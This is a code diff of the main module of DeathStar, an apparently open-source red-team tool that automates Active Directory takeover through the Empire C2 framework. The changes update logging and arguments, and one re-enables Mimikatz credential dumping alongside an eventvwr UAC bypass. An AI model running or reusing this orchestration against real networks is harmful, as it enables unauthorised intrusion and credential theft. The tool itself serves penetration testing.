@@ -24,19 +24,25 @@ import logging
 import argparse
 import asyncio
 import traceback
+from rich.logging import RichHandler
 from collections import Counter
 from deathstar.kybercrystals import KyberCrystals
 from deathstar.planetaryrecon import PlanetaryRecon
 from deathstar.empire import EmpireApiClient, EmpireLoginError
 from deathstar.utils import CustomArgFormatter, beautify_json, print_win_banner
 
-handler = logging.StreamHandler()
-handler.setFormatter(logging.Formatter("[%(name)s] %(levelname)s - %(message)s"))
+logging.basicConfig(
+    level=logging.INFO,
+    format="[{name}] {message}",
+    datefmt="[%X]",
+    style="{",
+    handlers=[RichHandler(rich_tracebacks=True, tracebacks_show_locals=True)]
+)
+
+logging.getLogger("httpx").setLevel(logging.ERROR)
+logging.getLogger("asyncio").setLevel(logging.ERROR)
 
 log = logging.getLogger("deathstar")
-log.setLevel(logging.DEBUG)
-log.addHandler(handler)
-
 
 class DeathStar:
     def __init__(self, empire):
@@ -191,8 +197,8 @@ class DeathStar:
             if not agent.high_integrity:
                 await self.kybers.bypassuac_eventvwr(agent)
 
-            # if agent.high_integrity:
-            #   await self.kybers.mimikatz(agent)
+            if agent.high_integrity:
+                await self.kybers.mimikatz(agent)
 
             while not self.won.is_set():
                 if agent.high_integrity:
@@ -296,6 +302,10 @@ class DeathStar:
             await asyncio.sleep(3)
 
     async def win_checker(self):
+        """
+        Checks for win conditions
+        """
+
         log.debug("Win checker started")
 
         while not self.won.is_set():
@@ -314,6 +324,10 @@ class DeathStar:
             await asyncio.sleep(3)
 
     async def power_up(self):
+        """
+        Logs into Empire, creates starter listener and starts all coroutines
+        """
+
         if "error" in await self.empire.listeners.get("DeathStar"):
             await self.empire.listeners.create(additional={"Port": 8443})
 
@@ -336,19 +350,26 @@ async def main(args):
         log.info("Powering up the DeathStar and waiting for agents")
         deathstar = DeathStar(empire)
         await deathstar.power_up()
+    finally:
+        await empire.close()
 
 
 def run():
     args = argparse.ArgumentParser(
         description=f"""
-DeathStar!
-
-Version: {__version__}
+        _______   _______     ___   .___________. __    __          _______.___________.    ___      .______      
+        |       \ |   ____|   /   \  |           ||  |  |  |        /       |           |   /   \     |   _  \     
+        |  .--.  ||  |__     /  ^  \ `---|  |----`|  |__|  |       |   (----`---|  |----`  /  ^  \    |  |_)  |    
+        |  |  |  ||   __|   /  /_\  \    |  |     |   __   |        \   \       |  |      /  /_\  \   |      /     
+        |  '--'  ||  |____ /  _____  \   |  |     |  |  |  |    .----)   |      |  |     /  _____  \  |  |\  \----.
+        |_______/ |_______/__/     \__\  |__|     |__|  |__|    |_______/       |__|    /__/     \__\ | _| `._____|
+                                                                                                           
+                                                Version: {__version__}
     """,
         formatter_class=CustomArgFormatter,
     )
-    args.add_argument("-u", "--username", type=str, default="empireadmin", help="Empire username")
-    args.add_argument( "-p", "--password", type=str, default="Password123!", help="Empire password")
+    args.add_argument("-u", "--username", type=str, required=True, help="Empire username")
+    args.add_argument( "-p", "--password", type=str, required=True, help="Empire password")
     args.add_argument("--api-host", type=str, default="127.0.0.1", help="Empire API IP/Hostname")
     args.add_argument("--api-port", type=int, default=1337, help="Empire API port")
     args.add_argument("--debug", action="store_true", help="Enable debug output")
@@ -356,11 +377,14 @@ Version: {__version__}
     args = args.parse_args()
 
     if args.debug:
-        log.setLevel(logging.DEBUG)
+        logging.getLogger().setLevel(logging.DEBUG)
 
-    log.debug(vars(args))
-    asyncio.run(main(args))
+    log.debug("Passed arguments\n --> %r", vars(args))
 
+    try:
+        asyncio.run(main(args))
+    except KeyboardInterrupt:
+        log.info("Exiting...")
 
 if __name__ == "__main__":
     run()
